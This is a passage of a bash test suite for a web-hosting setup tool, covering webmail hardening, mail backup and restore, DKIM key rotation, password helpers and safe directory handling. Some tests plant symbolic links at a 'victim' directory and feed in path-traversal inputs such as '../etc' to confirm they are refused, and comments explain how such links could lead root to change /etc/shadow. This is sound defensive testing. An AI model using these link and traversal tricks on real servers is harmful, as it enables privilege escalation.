assert_has  "and the signature is checked against the pinned one" "VALIDSIG" "$(declare -f _wm_fetch_release)"
# Upstream's updater, when it migrates a renamed configuration key, copies the live
# configuration next to itself as config.old.php - through the symlink, so the copy is the real
# thing - with root's umask, inside a tree every user of this machine can read. The keys
# lompstack writes are current, so that branch is not reached today; it is one upstream rename
# away, and what it would leave behind is the database password and the key that decrypts every
# logged-in mailbox's IMAP password.
assert_has "the release's configuration directory is not world-readable" 'chmod 0750 "${dest}/config"' "$(declare -f _wm_fetch_release)"
assert_has "and such a copy is removed after an update"                  'rm -f "${rel}/config/"*.old.php' "$(declare -f lib_webmail_update)"
# the log directory belongs to root: OpenLiteSpeed creates the vhost logs there as root, and a
# directory the webmail user could write would let it point one at any file on the system
assert_has "the log directory is root's" '"$WM_LOG_DIR" 0750 root:root' "$(declare -f lib_webmail_dirs_ensure)"
# upstream's updater rewrites the shared configuration, and its defaults are all the unsafe
# direction; a release that is thrown away must not leave its idea of it behind
_up="$(declare -f lib_webmail_update)"
assert_has "a failed update puts the configuration back" "_wm_config_restore" "$_up"
assert_has "and a successful one is rewritten from state" "lib_webmail_config_apply" "$_up"
assert_has "the symlink flip is checked"                  "_wm_current_set" "$_up"
# the webmail record can only be cleaned out of DNS while the state still says there is one
_dis="$(declare -f lib_mail_disable_main)"
_n_clean="$(grep -n 'lib_mail_dns_cleanup' <<<"$_dis" | head -1 | cut -d: -f1)"
_n_wmoff="$(grep -n 'lib_webmail_domain_disable' <<<"$_dis" | head -1 | cut -d: -f1)"
assert_true "DNS is cleaned before the webmail is switched off" \
  bash -c "(( ${_n_clean:-0} > 0 && ${_n_wmoff:-0} > 0 && ${_n_clean:-0} < ${_n_wmoff:-0} ))"
# and the certificate is asked for both names at once
_ce="$(declare -f lib_mail_domain_cert_ensure)"
assert_has "the mail certificate covers the webmail too" "lib_webmail_host" "$_ce"
assert_has "and asks what it covers, not whether it exists" "lib_ssl_cert_covers" "$_ce"

# a state file this call created is not left behind as an empty object when the filter is bad
_js2="$TMP/json-new.json"; rm -f "$_js2"
assert_eq  "a bad filter on a new file fails"  1 "$(run_isolated lib_json_set "$_js2" '.a = 1, .b = 2')"
assert_true "and leaves no empty state behind" bash -c "[[ ! -e '$_js2' ]]"

# =============================================================================
# The mail of a domain is backed up on its own, and put back the same way
_mb="$(declare -f lib_mail_backup_domain)"
assert_has "the mail archive is its own file"      '%s-mail-%s' "$(declare -f lib_mail_backup_file)"
assert_has "with a retention of its own"           'MAIL_BACKUP_KEEP' "$_mb"
assert_has "there has to be room for the copy"     "_mail_free_kb" "$_mb"
assert_has "on the mail's own filesystem"          '_mail_free_kb "$MAIL_VMAIL_HOME"' "$_mb"
assert_has "and on the one the archive lands on"   '_mail_free_kb "$BACKUP_ROOT"' "$_mb"
# a pipeline that fails has often printed its number already, so "|| printf 0" would append
# a second one and the check would quietly decide there is nothing to measure
assert_eq "a failed du reads as nothing"      0 "$(_mail_kb "")"
assert_eq "and a good one as its number"  10240 "$(_mail_kb "10240	somewhere")"
# the safety copy taken before a restore is not a candidate for "the newest archive"
_bk="$TMP/backups"; mkdir -p "${_bk}/a.example"
: >"${_bk}/a.example/a.example-mail-20260101-000000.tar.gz"
: >"${_bk}/a.example/a.example-mail-pre-restore-20260202-000000.tar.gz"
assert_eq "the safety copy is never the newest" "${_bk}/a.example/a.example-mail-20260101-000000.tar.gz"   "$(BACKUP_ROOT="$_bk" lib_mail_backup_latest a.example)"
assert_has "and it is named apart"             "pre-restore" "$(lib_mail_backup_file a.example 20260202-000000 pre-restore)"
assert_has "the DKIM key goes with it"             "dkim.key" "$_mb"
assert_has "and the lines, which hold only hashes" "MAIL_PASSWD_FILE" "$_mb"
# a live Maildir put straight into a tar describes a state the mailbox was never in
assert_has "Dovecot makes the copy, not tar"       "doveadm -o plugin/quota= backup" "$(declare -f _mail_backup_maildirs)"
# doveadm runs as vmail: the staging directory is made BY vmail, so root never creates a path
# inside a directory that user owns
_sd="$(declare -f _mail_stage_dir)"
assert_has "the staging directory is vmail's own"  'runuser -u "$MAIL_VMAIL_USER" -- mktemp -d' "$_sd"
_mr="$(declare -f lib_mail_restore_domain)"
assert_has "a restore checks the archive first"    "sha256sum -c" "$_mr"
assert_has "the same DKIM key comes back"          "dkim.key" "$_mr"
assert_has "the lines before the mail"             "lib_mail_passwd_set" "$_mr"
assert_has "the mail through Dovecot again"        "backup -R" "$_mr"
assert_has "then the quota is recomputed"          "quota recalc" "$_mr"
assert_has "and the webmail comes back with it"    "lib_webmail_domain_enable" "$_mr"
_bd="$(declare -f lib_backup_domain)"
assert_has "a site backup takes the mail too"      "lib_mail_backup_domain" "$_bd"
assert_has "unless it is told not to"              "no_mail" "$_bd"
_rm2="$(declare -f lib_restore_main)"
assert_has "and a restore puts it back"            "lib_mail_restore_domain" "$_rm2"
# the safety copy is taken AFTER the archive to restore from has been chosen, or "the newest
# one" would mean the copy of the state being replaced
_n_pick="$(grep -n 'lib_mail_backup_latest' <<<"$_rm2" | head -1 | cut -d: -f1)"
_n_safe="$(grep -n 'tag pre-restore' <<<"$_rm2" | head -1 | cut -d: -f1)"
assert_true "the archive is chosen before the safety copy"   bash -c "(( ${_n_pick:-0} > 0 && ${_n_safe:-0} > 0 && ${_n_pick:-0} < ${_n_safe:-0} ))"
assert_has "and --encrypt reaches the mail archive too" "encrypt" "$_bd"
# a mailbox that could not be filled is a failure, not a footnote
assert_has "a partly filled restore says so"       "only partly back" "$_mr"
# the archive says whose mail it holds, and a mismatch is a question
assert_has "the manifest's domain is compared"     'jq -r' "$_mr"
assert_has "and answering no stops it"             "belongs to" "$_mr"

# =============================================================================
# Rotating a DKIM key: two steps with DNS in between, because the key is published
_rs="$(declare -f lib_mail_dkim_rotate_start)"
_rf="$(declare -f lib_mail_dkim_rotate_finish)"
assert_has "starting makes a SECOND key"          "selector_next" "$_rs"
assert_has "and does not touch the one in use"    "still signs with" "$_rs"
assert_has "a job watches for the record"         "lib_cron_set" "$_rs"
assert_has "the switch compares what DNS says"    "_mail_dns_query TXT" "$_rf"
assert_has "against the key itself"               "lib_mail_dkim_public_of" "$_rf"
assert_has "and keeps the old one for a while"    "selector_old_until" "$_rf"
assert_has "the retired key is removed later"     "selector_old_until" "$(declare -f lib_mail_dkim_retire_old)"
# a selector that has been in DNS must never be handed to a second key: resolvers hold what
# they cached until the TTL runs out
assert_has "every selector used is remembered"   "selectors_used" "$_rs"
assert_has "and never chosen again"              "selectors_used" "$(declare -f _mail_selector_next)"
# two records at one selector fail for every receiver, so that is a reason to wait
assert_has "a second record stops the switch"    "carries" "$_rf"
assert_has "and the name has to hold a DKIM record at all" "v=DKIM1" "$_rf"
# a domain that goes takes every key with it, not only the one it was signing with
_pg="$(declare -f lib_mail_domain_purge)"
assert_has "removing a domain takes every DKIM key" '${MAIL_DKIM_DIR}/${d}."*.key' "$_pg"
assert_has "and the job that watched for a record"  'lib_cron_remove "mail-dkim:' "$_pg"
# a selector is dated, and a second one in the same month gets a letter
eval 'lib_mail_selector() { printf "lomp209901"; }'
MAIL_DKIM_DIR="$TMP/dkim-next"; mkdir -p "$MAIL_DKIM_DIR"
_sn="$(_mail_selector_next x.example)"
assert_true "a free selector is not the one in use" bash -c "[[ '$_sn' != 'lomp209901' ]]"
assert_true "and it is dated"                      bash -c "[[ '$_sn' =~ ^lomp[0-9]{6}[a-j]?$ ]]"
printf 'key
' >"${MAIL_DKIM_DIR}/x.example.${_sn}.key"   # -s: a selector is taken only when its key has content
assert_true "a taken one is skipped too"           bash -c "[[ '$(_mail_selector_next x.example)' != '$_sn' ]]"
unset -f lib_mail_selector
# shellcheck source=/dev/null
source "$ROOT/lib/mail.sh"

# =============================================================================
# Changing a mailbox password from the webmail: one helper, one sudo rule, nothing on argv
_ph="$(lib_mail_render_pw_helper)"
assert_has "the helper reads the address from stdin"   "IFS= read -r addr" "$_ph"
assert_has "and both passwords too"                    "IFS= read -r new" "$_ph"
assert_lacks "the address is not an argument"          'addr="$1"' "$_ph"
assert_lacks "nor is a password"                      'new="$3"' "$_ph"
# the stored hash must not become an argument of a root process: /proc/<pid>/cmdline is
# world-readable, and the hash is the thing the file mode exists to protect
assert_has "Dovecot is asked, with the password on stdin" "doveadm auth test" "$_ph"
assert_lacks "the stored hash is never an argument"       'doveadm pw -t "$hash"' "$_ph"
assert_has "every attempt is logged"                      "logger -t lomp-webmail" "$_ph"
assert_has "and none of them is fast"                     "GAP" "$_ph"
assert_has "a line break in the new one is refused"    "may not contain a line break" "$_ph"
assert_has "so is one that is too short"               "too short" "$_ph"
assert_has "and one that is too long for bcrypt"       "72 bytes at most" "$_ph"
assert_has "the change goes through the ordinary command" "mail box passwd" "$_ph"

assert_true "the helper parses"                        bash -c "printf '%s' \"\$_ph\" | bash -n"
_ps="$(lib_mail_render_pw_sudoers)"
assert_has "the rule names the webmail user"           "lompwebmail ALL=(root)" "$_ps"
assert_has "and exactly one command"                   "webmail-passwd" "$_ps"
assert_lacks "with no wildcard in it"                  "ALL$" "$_ps"
# the driver hands all three to the helper, so the helper can insist on the current password
_pd="$(lib_webmail_render_pw_driver)"
assert_has "the driver sends the address"              'fwrite($handle, $username' "$_pd"
assert_has "the current password"                      '$currpass' "$_pd"
assert_has "and the new one"                           '$newpass' "$_pd"
assert_has "it is written into every release"          "plugins/password/drivers" "$(declare -f lib_webmail_pw_driver_install)"
assert_has "the webmail is told to use it"             "password_driver'] = 'lomp'" "$(lib_webmail_render_config 2>/dev/null || printf '')"
assert_has "and to ask for the current password"       "password_confirm_current'] = true" "$(lib_webmail_render_config 2>/dev/null || printf '')"

# a port that carries a password without TLS may answer this machine and nobody else
eval 'ss() { printf "%s\n" "LISTEN 0 100 127.0.0.1:10587 0.0.0.0:*" "LISTEN 0 100 0.0.0.0:993 0.0.0.0:*" | awk "{print \$1, \$2, \$3, \$4, \$5}"; }'
assert_false "a loopback port is not public"  lib_port_listening_public 10587
assert_true  "one on every address is"        lib_port_listening_public 993
unset -f ss

# =============================================================================
section "restore: a dry run describes the site the archive carries"
# A dry run writes no domain.json, so a restore that would recreate a site cannot read the
# state back from the file it did not write: lib_domain_state_load resets every D_* before it
# looks at whether the file is there, so the dry run went on to describe creating a user with
# no name, and rendered the vhost of a static site with PHP enabled. It reads the archived
# copy by path instead.
lib_domain_state_reset
_arch="$TMP/archived-domain.json"
D_DOMAIN="arch.example.com"; D_IDENT="arch_example_com"; D_USER="arch_example_com"
D_GROUP="arch_example_com"; D_HOME="$SITES_ROOT/arch.example.com"; D_MODE="static"
D_CREATED="2025-01-01T00:00:00Z"; D_STATUS="active"
lib_domain_state_json >"$_arch"
lib_domain_state_reset
assert_true  "the state loads out of a file of its own" lib_domain_state_load_file "$_arch" arch.example.com
assert_eq    "with the site's name"  "arch.example.com" "$D_DOMAIN"
assert_eq    "its mode"              "static"           "$D_MODE"
assert_eq    "and its system user"   "arch_example_com" "$D_USER"
# the reset that started all of this, stated out loud: a load that finds nothing leaves nothing
assert_false "a file that is not there fails"      lib_domain_state_load_file "$TMP/nope.json" arch.example.com
assert_eq    "and clears the state on its way out" "" "$D_DOMAIN"
lib_domain_state_reset
_rm3="$(declare -f lib_restore_main)"
assert_has "so a dry run recreating a site reads the archive" "lib_domain_state_load_file" "$_rm3"
# This was a bare statement: a dry run of an unregistered site had no domain.json, the load
# returned 1, and errexit ended the restore right there - after it had described the whole job.
assert_eq "and no step reads the state back unguarded" "" \
  "$(grep -nE '^[[:space:]]*lib_domain_state_load "\$domain"[[:space:]]*$' "$ROOT/lib/backup.sh" || true)"
# "would import db-x.sql.gz into " - the dump read as if it were going nowhere
_dbinfo="$TMP/archived-db.info"
printf 'DB_NAME=arch_db\nDB_USER=arch_user\nDB_PASS=s3cret\n' >"$_dbinfo"
DBI_NAME=""; DBI_USER=""; DBI_PASS=""
OPT_DRY_RUN=1
assert_true "a dry run takes the archived credentials" lib_db_recreate_from_info arch.example.com "$_dbinfo"
OPT_DRY_RUN=0
assert_eq "and names the database it would import into" "arch_db"   "$DBI_NAME"
assert_eq "and the user that owns it"                   "arch_user" "$DBI_USER"
assert_eq "while the password stays out of it"          ""          "$DBI_PASS"
assert_false "and it created nothing" test -e "$(lib_db_info_file arch.example.com)"
DBI_NAME=""; DBI_USER=""; DBI_PASS=""

# =============================================================================
section "no command replaces itself and skips the EXIT cleanup"
assert_eq "no 'exec tail' in the libraries" "" "$(grep -nE '^[[:space:]]*exec tail' "$ROOT"/lib/*.sh || true)"

# =============================================================================
section "lib_mkdir never follows a link below a site home"
# A site user owns /home/<domain> and can swap any entry there for a symbolic link, while
# lib_mkdir runs as root whenever "add" or "restore" meets an existing home. With
# "private -> /etc" in place it chmodded and chowned /etc for that user.
lib_rollback_clear
_lh="$SITES_ROOT/links.example.com"
assert_eq "nested directories are created" 0 "$(run_isolated lib_mkdir "${_lh}/private/sessions/" 0700)"
assert_true "a trailing slash is accepted" test -d "${_lh}/private/sessions"
if (( CAN_CHMOD )); then assert_eq "the mode lands on the last directory" "700" "$(stat -c %a "${_lh}/private/sessions")"; fi
assert_eq "an existing directory is fine" 0 "$(run_isolated lib_mkdir "${_lh}/private" 0700)"
OPT_DRY_RUN=1; lib_mkdir "${_lh}/dry-run" 0700; OPT_DRY_RUN=0
assert_false "dry-run creates nothing" test -e "${_lh}/dry-run"
: >"${_lh}/a-file"
assert_eq "a file in the way is an error" 1 "$(run_isolated lib_mkdir "${_lh}/a-file/sub")"
assert_eq "a path climbing out with .. is refused" 1 "$(run_isolated lib_mkdir "${_lh}/private/../../escaped")"
assert_false "and nothing is created outside the home" test -e "${SITES_ROOT}/escaped"
assert_has "the refusal says why" "'..' is not allowed" "$( ( lib_mkdir "${_lh}/private/../../escaped" ) 2>&1 || true )"
if (( CAN_SYMLINK )); then
  _victim="$TMP/victim"; mkdir -p "$_victim"; chmod 0751 "$_victim" 2>/dev/null || true
  ln -s "$_victim" "${_lh}/logs"
  assert_eq "the directory itself may not be a link" 1 "$(run_isolated lib_mkdir "${_lh}/logs" 0750)"
  assert_has "and the refusal names it" "${_lh}/logs is a symbolic link" "$( ( lib_mkdir "${_lh}/logs" 0750 ) 2>&1 || true )"
  rm -rf "${_lh}/private"; ln -s "$_victim" "${_lh}/private"
  assert_eq "nor may a directory above it" 1 "$(run_isolated lib_mkdir "${_lh}/private/sessions" 0700)"
  assert_false "nothing is created through the link" test -e "${_victim}/sessions"
  # proxy static paths end in "/", and "link/" is the directory behind the link
  mkdir -p "${_lh}/public_html"; ln -s "$_victim" "${_lh}/public_html/static"
  assert_eq "a trailing slash does not hide a link" 1 "$(run_isolated lib_mkdir "${_lh}/public_html/static/" 0755)"
  # the reported flow: the directory setup of "add" or "restore" meeting that home again
  lib_domain_state_reset
  D_DOMAIN="links.example.com"; D_IDENT="links_example_com"; D_USER="links_example_com"; D_GROUP="links_example_com"
  D_HOME="$_lh"; D_MODE="php"
  assert_eq "the site directory setup refuses the planted link" 1 "$(run_isolated lib_domain_dirs_create)"
  lib_domain_state_reset
  # outside the site homes the directory itself still may not be a link: the OLS cache
  # directory belongs to nobody and the vhost directory to lsadm...
  mkdir -p "$TMP/cache-owner"; ln -s "$_victim" "$TMP/cache-owner/links.example.com"
  assert_eq "a link outside the site homes is refused too" 1 "$(run_isolated lib_mkdir "$TMP/cache-owner/links.example.com" 0750)"
  if (( CAN_CHMOD )); then assert_eq "no attempt reached the link target" "751" "$(stat -c %a "$_victim")"; fi
  # ...while links in root's own part of a path are followed as before
  mkdir -p "$TMP/lsws-real"; ln -s "$TMP/lsws-real" "$TMP/lsws-link"
  assert_eq "a linked parent such as /usr/local/lsws still works" 0 "$(run_isolated lib_mkdir "$TMP/lsws-link/conf/vhosts/x" 0750)"
  assert_true "and the directory lands behind it" test -d "$TMP/lsws-real/conf/vhosts/x"
  _sites_save="$SITES_ROOT"; ln -s "$SITES_ROOT" "$TMP/home-link"; SITES_ROOT="$TMP/home-link"
  assert_eq "so does a SITES_ROOT that is itself a link" 0 "$(run_isolated lib_mkdir "$SITES_ROOT/moved.example.com/public_html" 0755)"
  SITES_ROOT="$_sites_save"
fi

# =============================================================================
section "writes inside a site home run as the site user"
# Root must not create, chmod or unpack files below /home/<domain> either: "cat > index.html"
# through a link the user left there creates whatever file it names, and a chmod through one
# reaches /etc/shadow. The suite cannot switch users, so it checks each step goes to runuser.
lib_rollback_clear
lib_domain_state_reset
D_DOMAIN="asuser.example.com"; D_IDENT="asuser_example_com"; D_USER="asuser_example_com"; D_GROUP="asuser_example_com"
D_HOME="$SITES_ROOT/asuser.example.com"; D_MODE="php"; D_PHP="8.3"
_as="-u asuser_example_com -- env -C /"
: >"$RUNUSER_LOG"
assert_eq "the directory setup exits 0" 0 "$(run_isolated lib_domain_dirs_create)"
assert_true "the placeholder page is written" test -s "${D_HOME}/public_html/index.html"
assert_has "by the site user" "${_as} tee ${D_HOME}/public_html/index.html" "$(cat "$RUNUSER_LOG")"

curl() { printf 'server-setup-php-ok:8.3'; }
: >"$RUNUSER_LOG"
assert_eq "the PHP probe exits 0" 0 "$(run_isolated lib_domain_php_probe)"
assert_has "its file is written by the site user" "${_as} tee ${D_HOME}/public_html/ss-probe-" "$(cat "$RUNUSER_LOG")"
assert_has "and removed by it" "${_as} rm -f -- ${D_HOME}/public_html/ss-probe-" "$(cat "$RUNUSER_LOG")"
assert_eq "nothing is left behind" "" "$(find "${D_HOME}/public_html" -name 'ss-probe-*')"
unset -f curl

# WordPress already present: only the ownership and permission pass runs
_wpbin_save="$WPCLI_BIN"; WPCLI_BIN="$TMP/wp-launcher"
mkdir -p "$INSTALL_DIR"; printf '#!/bin/sh\n' >"$WPCLI_PHAR"; printf '#!/bin/sh\n' >"$WPCLI_BIN"
chmod 0755 "$WPCLI_PHAR" "$WPCLI_BIN"
lib_domain_state_save
printf 'DB_NAME=asuser_db\nDB_USER=asuser_user\nDB_PASS=unused\n' >"$(lib_db_info_file "$D_DOMAIN")"
mkdir -p "${D_HOME}/public_html/wp-content"; printf '<?php\n' >"${D_HOME}/public_html/wp-config.php"
chmod 0700 "${D_HOME}/public_html/wp-content" 2>/dev/null || true
: >"$RUNUSER_LOG"
assert_eq "the WordPress permission pass exits 0" 0 "$(run_isolated lib_domain_wp_install)"
_log="$(cat "$RUNUSER_LOG")"
assert_has "directory modes are set by the site user" "${_as} find ${D_HOME}/public_html -type d -exec chmod 0755 {} +" "$_log"
assert_has "file modes too"                           "${_as} find ${D_HOME}/public_html -type f -exec chmod 0644 {} +" "$_log"
assert_has "and wp-config.php"                        "${_as} chmod 0640 ${D_HOME}/public_html/wp-config.php" "$_log"
if (( CAN_CHMOD )); then
  assert_eq "a directory is normalised"  "755" "$(stat -c %a "${D_HOME}/public_html/wp-content")"
  assert_eq "wp-config.php ends at 0640" "640" "$(stat -c %a "${D_HOME}/public_html/wp-config.php")"
fi
WPCLI_BIN="$_wpbin_save"
rm -f "$(lib_db_info_file "$D_DOMAIN")"   # a database would need a real dump below

# restore: take a real backup, change a file, restore, and look at who unpacked it
_orig_rt="$(declare -f lib_require_tools)"; _orig_ri="$(declare -f lib_require_installed)"
lib_require_tools() { return 0; }; lib_require_installed() { return 0; }
mkdir -p "${D_HOME}/public_html/sub"; printf 'v1\n' >"${D_HOME}/public_html/sub/page.html"
assert_eq "a backup of the site is taken" 0 "$(run_isolated lib_backup_domain "$D_DOMAIN" --keep 0)"
_archives=("${BACKUP_ROOT}/${D_DOMAIN}"/*.tar.gz)
printf 'v2\n' >"${D_HOME}/public_html/sub/page.html"
: >"$RUNUSER_LOG"
assert_eq "restore exits 0" 0 "$(run_isolated lib_restore_main "$D_DOMAIN" --file "${_archives[0]}")"
assert_eq "the archived content is back" "v1" "$(cat "${D_HOME}/public_html/sub/page.html")"
# The home in the logged line is not spelled out: under Git Bash it round-trips through native
# jq in domain.json and comes back as a C:\ path, so match only the mangling-proof ends - the
# runuser+env-C prefix (this ran as the site user) and the stdin-extract flags.
_rlog="$(cat "$RUNUSER_LOG")"
assert_has "restore unpacks as the site user" "${_as} tar -C" "$_rlog"
assert_has "and does so by extracting the archive" "-xzpf -" "$_rlog"
eval "$_orig_rt"; eval "$_orig_ri"
lib_domain_state_reset

# =============================================================================
section "PHP extensions: SQLite and APCu by default, and update adds what a server lacks"
# a real server had no pdo_sqlite, and the application on it did not start
assert_eq "the base set brings SQLite and APCu" \
  "lsphp83 lsphp83-common lsphp83-mysql lsphp83-sqlite3 lsphp83-opcache lsphp83-curl lsphp83-imagick lsphp83-intl lsphp83-redis lsphp83-apcu" \
  "$(_php_packages 8.3)"
for _e in sqlite3 pdo_sqlite apcu ctype tokenizer phar; do assert_has "${_e} is required" " ${_e} " " ${PHP_REQUIRED_EXTS} "; done
_orig_pkgfns="$(declare -f lib_pkg_available lib_pkg_installed lib_apt_install)"
_fx="$TMP/fakeext"; mkdir -p "$_fx/bin"; export FAKE_MODS="$_fx/mods"
printf '#!/usr/bin/env bash\ncat "$FAKE_MODS"\n' >"$_fx/bin/php"; chmod +x "$_fx/bin/php"
_ext_reset() {   # "php -m" of a build without the three, and nothing installed yet
  local e=""
  for e in $PHP_REQUIRED_EXTS; do
    case "$e" in sqlite3|pdo_sqlite|apcu) ;; opcache) printf 'Zend OPcache\n' ;; *) printf '%s\n' "$e" ;; esac
  done >"$FAKE_MODS"
  : >"$_fx/installed"; : >"$_fx/calls"; PHP_EXTS_ADDED=""; FAKE_REPO="lsphp83-sqlite3 lsphp83-apcu"
}
eval 'lib_php_cli()       { printf "%s/bin/php" "$_fx"; }
      lib_pkg_available() { [[ " ${FAKE_REPO} " == *" $1 "* ]]; }
      lib_pkg_installed() { grep -qx -- "$1" "$_fx/installed"; }
      lib_apt_install() {   # logs the call; outside a dry run the modules of the package appear
        printf "%s\n" "$*" >>"$_fx/calls"
        (( OPT_DRY_RUN )) && return 0
        printf "%s\n" "$@" >>"$_fx/installed"
        case "$1" in *-sqlite3) printf "sqlite3\npdo_sqlite\n" >>"$FAKE_MODS" ;; *-apcu) printf "apcu\n" >>"$FAKE_MODS" ;; esac
      }
      lib_php_restart_workers() { printf "restart\n" >>"$_fx/calls"; }'
_ext_reset
assert_eq "it exits 0 under errexit" 0 "$(run_isolated lib_php_ensure_extensions 8.3)"
_ext_reset
OPT_QUIET=0 lib_php_ensure_extensions 8.3 >"$_fx/out" 2>&1
assert_eq  "SQLite's two extensions share one package, installed once" "$(printf 'lsphp83-sqlite3\nlsphp83-apcu')" "$(cat "$_fx/calls")"
assert_eq  "the caller learns what was added" "lsphp83-sqlite3 lsphp83-apcu" "$PHP_EXTS_ADDED"
assert_has "and the report names it" "all required extensions present (installed lsphp83-sqlite3 lsphp83-apcu)" "$(cat "$_fx/out")"
: >"$_fx/calls"; lib_php_ensure_extensions 8.3 >/dev/null 2>&1
assert_eq  "a second run installs nothing" "" "$(cat "$_fx/calls")"
_ext_reset; FAKE_REPO="lsphp83-sqlite3"
OPT_QUIET=0 lib_php_ensure_extensions 8.3 >"$_fx/out" 2>&1
assert_has "one the repository lacks is reported" "extensions still missing: apcu" "$(cat "$_fx/out")"
_ext_reset; OPT_DRY_RUN=1
assert_eq "a dry run exits 0 under errexit" 0 "$(run_isolated lib_php_ensure_extensions 8.3)"
_ext_reset
OPT_QUIET=0 lib_php_ensure_extensions 8.3 >"$_fx/out" 2>&1
OPT_DRY_RUN=0
assert_eq    "a dry run names each package once" "$(printf 'lsphp83-sqlite3\nlsphp83-apcu')" "$(cat "$_fx/calls")"
assert_eq    "adds nothing" "" "$PHP_EXTS_ADDED"
assert_has   "says what it would install" "would install lsphp83-sqlite3 lsphp83-apcu" "$(cat "$_fx/out")"
assert_lacks "and calls nothing missing" "still missing" "$(cat "$_fx/out")"
_ext_reset
eval 'lib_php_installed()    { return 0; }
      lib_php_full_version() { printf "8.3.33"; }
      lib_php_write_ini()    { return 0; }
      lib_php_register()     { return 0; }'
lib_php_install 8.3 >/dev/null 2>&1
assert_eq "a version that is already serving gets its workers restarted" "restart" "$(tail -n 1 "$_fx/calls")"
: >"$_fx/calls"; lib_php_install 8.3 >/dev/null 2>&1
assert_eq "but not when nothing was added" "" "$(cat "$_fx/calls")"
_upd="$(declare -f lib_update_main)"
assert_has "update checks every installed version" 'lib_php_ensure_extensions "$v"' "$_upd"
assert_has "and restarts the workers for what it added" '-n "$PHP_EXTS_ADDED"' "$_upd"
eval "$_orig_pkgfns"; unset FAKE_MODS FAKE_REPO
# shellcheck source=/dev/null
source "$ROOT/lib/php.sh"

# =============================================================================
section "fix-owner: files uploaded as root go back to the site's user"
# Files uploaded as root stay root's, and PHP, which runs as the site's user, cannot change
# them. The suite cannot own a file as anybody else, so the numbers fix-owner compares with
# come from a stub: the runner's own (nothing to hand over) or the next uid (all of it is
# someone else's). chown is a program find starts, so a fake one on -execdir's PATH records
# every call and every name it was handed, as a full path.
_fo_saved="$(declare -p DOM_FIX_OWNER_PATH DOM_HARDLINKS_SYSCTL DOM_MOUNTINFO STATE_DIR)"
_fo_orig_ids="$(declare -f _domain_fix_owner_ids)"
_fo_orig_rt="$(declare -f lib_require_tools)"
eval 'lib_require_tools() { return 0; }
      _domain_fix_owner_ids() { printf "%s" "$_fo_ids"; }'
_fo_bin="$TMP/fo-bin"; _fo_calls="$TMP/fo-calls"; _fo_out="$TMP/fo-out"
mkdir -p "$_fo_bin"
# A name that is not relative to the directory chown runs in ("./x") is logged as PATH: it
# would be looked up from the top again, through whatever a site user swapped in meanwhile.
cat >"$_fo_bin/chown" <<EOF
#!/bin/sh
d="\$(pwd -P)"
printf 'fake-chown %s\n' "\$*" >&2
printf 'call %s %s %s\n' "\$1" "\$2" "\$3" >>"${_fo_calls}"
shift 3
for f in "\$@"; do
  case "\$f" in
    ./*/*|../*) printf 'PATH %s\n' "\$f" >>"${_fo_calls}" ;;
    ./*)        printf '%s/%s\n' "\$d" "\${f#./}" >>"${_fo_calls}" ;;
    *)          printf 'PATH %s\n' "\$f" >>"${_fo_calls}" ;;
  esac
done
EOF
chmod 0755 "$_fo_bin/chown"
DOM_FIX_OWNER_PATH="${_fo_bin}:/usr/bin:/bin"
DOM_HARDLINKS_SYSCTL="$TMP/fo-hardlinks"; printf '1\n' >"$DOM_HARDLINKS_SYSCTL"
DOM_MOUNTINFO="$TMP/fo-mountinfo"; : >"$DOM_MOUNTINFO"
# a state directory of its own, so that --all sees only the sites made here - through the real
# lib_domains_list, which the webmail section above leaves stubbed
STATE_DIR="$TMP/fo-state"; mkdir -p "$STATE_DIR"
eval "$(sed -n '/^lib_domains_list() {/,/^}/p' "$ROOT/lib/common.sh")"
# fix-owner run the way the command runs it (errexit armed); prints the exit status, and the
# output goes to $_fo_out
_fo() {
  local rc=0 prev=""
  prev="$(trap -p ERR || true)"
  trap - ERR
  set +e
  ( set -Eeuo pipefail; shopt -s lastpipe; OPT_QUIET=0; lib_domain_fix_owner_main "$@" ) >"$_fo_out" 2>&1
  rc=$?
  set -e
  [[ -z "$prev" ]] || eval "$prev"
  printf '%s' "$rc"
}

lib_domain_state_reset
D_DOMAIN="own.example.com"; D_IDENT="own_example_com"; D_USER="own_example_com"; D_GROUP="own_example_com"
D_HOME="$SITES_ROOT/own.example.com"; D_MODE="php"; D_PHP="8.3"
lib_domain_state_save
_fo_h="$SITES_ROOT/own.example.com"; _fo_ld="$SITES_LOG_ROOT/own.example.com"
mkdir -p "$_fo_h/public_html/wp-content/uploads" "$_fo_h/private/sessions" "$_fo_h/.ssh" "$_fo_ld"
printf '<?php\n' >"$_fo_h/public_html/index.php"
printf 'jpg' >"$_fo_h/public_html/wp-content/uploads/a.jpg"
printf 'zip' >"$_fo_h/site.zip"
printf 'log\n' >"$_fo_ld/access.log"
if (( CAN_SYMLINK )); then ln -s "$_fo_ld" "$_fo_h/logs"; else mkdir -p "$_fo_h/logs"; printf 'log\n' >"$_fo_h/logs/access.log"; fi
_fo_hp="$(cd "$_fo_h" && pwd -P)"
read -r _fo_u _fo_g < <(stat -c '%u %g' "$_fo_h/public_html/index.php")
_fo_mine="${_fo_u} ${_fo_g}"; _fo_other="$(( _fo_u + 1 )) ${_fo_g}"
# everything in the home but logs/: what a run has to hand over when none of it is the site's
_fo_all="$(find "$_fo_h" -path "$_fo_h/logs" -prune -o -printf . | wc -c)"; _fo_all=$(( _fo_all ))

assert_eq  "no domain is an error"               1 "$(_fo)"
assert_has "which says so"                       "Domain missing" "$(cat "$_fo_out")"
assert_eq  "--all and a domain do not mix"       1 "$(_fo --all own.example.com)"
assert_eq  "an unknown option is refused"        1 "$(_fo --force)"
assert_eq  "a site that is not registered too"   1 "$(_fo nosuch.example.com)"
assert_eq  "and a name that is no domain"        1 "$(_fo ../etc)"

_fo_ids="$_fo_other"
printf '0\n' >"$DOM_HARDLINKS_SYSCTL"; : >"$_fo_calls"
assert_eq  "without protected hard links it refuses to start" 1 "$(_fo own.example.com)"
assert_has "and says why" "fs.protected_hardlinks is off" "$(cat "$_fo_out")"
assert_eq  "before chown ever runs" "" "$(cat "$_fo_calls")"
rm -f "$DOM_HARDLINKS_SYSCTL"
assert_eq  "a setting it cannot read counts as off" 1 "$(_fo own.example.com)"
OPT_DRY_RUN=1
assert_eq  "a dry run only warns about it" 0 "$(_fo own.example.com)"
assert_has "that a real run would refuse" "a real run refuses to start" "$(cat "$_fo_out")"
OPT_DRY_RUN=0
printf '1\n' >"$DOM_HARDLINKS_SYSCTL"

_fo_ids="$_fo_mine"; : >"$_fo_calls"
assert_eq  "a site whose files are all its own exits 0" 0 "$(_fo own.example.com)"
assert_has "and says so" "own.example.com: everything already belongs to own_example_com" "$(cat "$_fo_out")"
assert_eq  "without starting chown: nothing is re-dated" "" "$(cat "$_fo_calls")"

